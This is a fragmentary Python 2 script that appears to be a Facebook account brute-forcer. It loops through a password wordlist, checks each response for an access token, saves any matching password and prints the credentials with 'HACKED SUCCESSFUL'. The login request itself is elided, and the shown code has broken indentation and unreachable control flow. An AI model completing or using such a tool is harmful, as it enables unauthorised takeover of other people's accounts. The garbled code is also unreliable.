...
def ceknet():
    try:
    	os.system('reset')
        print internet
        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mCONNECTING SERVER..'
        time.sleep(2)
        toolbar_width = 25
        ...
        try:
            ...
            time.sleep(3.5)
            print '\033[37;1m]\033[35;1m ~>\033[31;1mNo Connectiòn'
            time.sleep(1.5)
            sys.exit()
            ...
            for pw in sandi:
                try:
                    ...
                    if 'access_token' in mpsh:
                        ...
                        dapat.write('[PW]=> ' + pw)
                        dapat.close()
                        print '\n\n\033[32;1m[+] \033[37;1mPASSWORD GANRATED'
                        print '\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
                        print '\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
                        print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1mHACKED SUCCESSFUL'
                        print '\033[32;1m[=] \033[37;1mDONE'
                        sys.exit()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ...
                            print '\033[33;1m[=] \033[37;1mHACKED SUCCESSFUL'
                            sys.exit()
                except requests.exceptions.ConnectionError:
                    print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mTools error'
                    sys.exit()

        except IOError:
            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mNot Found wordlist No File'
            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mPlease Try Again Later'
            sys.exit()
